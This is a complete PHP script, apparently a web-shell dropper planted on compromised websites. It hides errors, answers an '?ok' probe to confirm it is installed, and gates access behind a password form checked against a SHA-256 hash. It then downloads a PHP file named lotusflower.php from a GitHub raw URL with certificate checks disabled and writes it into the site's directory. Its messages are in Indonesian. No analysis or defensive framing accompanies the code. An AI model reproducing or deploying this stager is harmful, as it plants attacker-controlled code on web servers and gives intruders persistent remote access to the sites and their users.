<?php
error_reporting(0);
if(isset($_REQUEST["ok"])){die(">ok<");}

if (function_exists('session_start')) { 
    session_start(); 
    if (!isset($_SESSION['secretyt'])) { $_SESSION['secretyt'] = false; } 
    if (!$_SESSION['secretyt']) { 
        if (isset($_POST['pwdyt']) && hash('sha256', $_POST['pwdyt']) == '0a3fae3a3a24655a1a6f77b2d00df00ad0aa3493ac173ef1a09aa4e61a3cc51d') {
            $_SESSION['secretyt'] = true; 
        } else { 
            die('<html><head><meta charset="utf-8"><title></title><style type="text/css">body {padding:10px} input { padding: 2px; display:inline-block; margin-right: 5px; }</style></head><body><form action="" method="post" accept-charset="utf-8"><input type="password" name="pwdyt" placeholder="passwd"><input type="submit" name="submit" value="submit"></form></body></html>'); 
        } 
    } 
}

$remote_file = "https://raw.githubusercontent.com/soy777/johnygreenwoodsz/main/lotusflower.php";
$local_file = __DIR__ . "/lotusflower.php";

$body = '';

if (function_exists('curl_init')) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $remote_file);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0");
    $body = curl_exec($ch);
    curl_close($ch);
} else {
    $body = @file_get_contents($remote_file);
}

if (!empty($body)) {
    if (file_put_contents($local_file, $body)) {
        echo "File berhasil diunduh dan disimpan: " . $local_file;
    } else {
        echo "Gagal menyimpan file. Periksa permission folder.";
    }
} else {
    echo "Gagal download file dari GitHub. Periksa URL dan koneksi.";
}
?>
